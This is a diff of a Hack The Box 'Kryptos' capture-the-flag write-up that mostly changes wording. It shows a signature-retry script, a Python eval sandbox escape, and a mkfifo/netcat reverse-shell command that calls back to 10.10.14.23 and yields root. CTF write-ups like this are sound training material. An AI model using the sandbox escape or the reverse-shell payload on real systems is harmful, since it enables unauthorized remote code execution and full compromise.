-root@ragingunicorn:~/htb/kryptos# ssh -L 81:127.0.0.1:81 rijndael@kryptos.htb
+# ssh -L 81:127.0.0.1:81 rijndael@kryptos.htb
 rijndael@kryptos.htb's password:
 ```
 
-Then I modified the script to take the expression from CLI argument and submit it until we get a valid signature:
+Then I modify the script to take the expression from CLI argument and submit it until I get a valid signature:
 
 ```python
 if len(sys.argv) != 2:
@@ -1064,10 +1062,10 @@ while True:
         exit()
 ```
 
-The script works and after a few seconds I get a valid signature and the expression I submitted got evaluated.
+The script works and after a few seconds I get a valid signature and the expression I submitted gets evaluated.
 
 ```
-root@ragingunicorn:~/htb/kryptos# python expr.py "'This '+'is'+' working'"
+# python expr.py "'This '+'is'+' working'"
 Found a valid signature after 4 tries
 {
   "response": {
@@ -1077,16 +1075,16 @@ Found a valid signature after 4 tries
 }
 ```
 
-Now we need to fix the last part: find a way to bypass the empty builtins set on the eval function.
+Now I need to fix the last part: find a way to bypass the empty builtins set on the eval function. This a classic Python CTF challenge and there are multiple blogs showing various ways to jail escape this.
 
 ```
-root@ragingunicorn:~/htb/kryptos# python expr.py "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f')"
+# python expr.py "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f')"
 ```
 
-After a few seconds, I got a reverse shell as `root`:
+My eval works now and I get a reverse shell as `root`:
 
 ```
-root@ragingunicorn:~/htb/kryptos# nc -lvnp 4444
+# nc -lvnp 4444
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
